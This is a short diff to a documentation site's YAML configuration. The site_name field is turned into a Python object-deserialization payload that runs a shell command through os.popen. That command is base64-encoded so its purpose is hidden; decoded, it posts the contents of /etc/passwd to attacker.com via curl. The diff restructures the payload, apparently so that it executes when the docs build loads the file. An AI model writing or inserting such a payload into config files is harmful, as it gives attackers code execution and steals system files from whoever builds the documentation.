@@ -1,7 +1,9 @@
 site_name: !!python/object/apply:os.popen
-  - "echo Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tIC1kICIkKGNhdCAvZXRjL3Bhc3N3ZCkiCg== | base64 -d | bash"
+  args:
+    - "echo Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tIC1kICIkKGNhdCAvZXRjL3Bhc3N3ZCkiCg== | base64 -d | bash"
 plugins:
   - techdocs-core
+
 
 
 
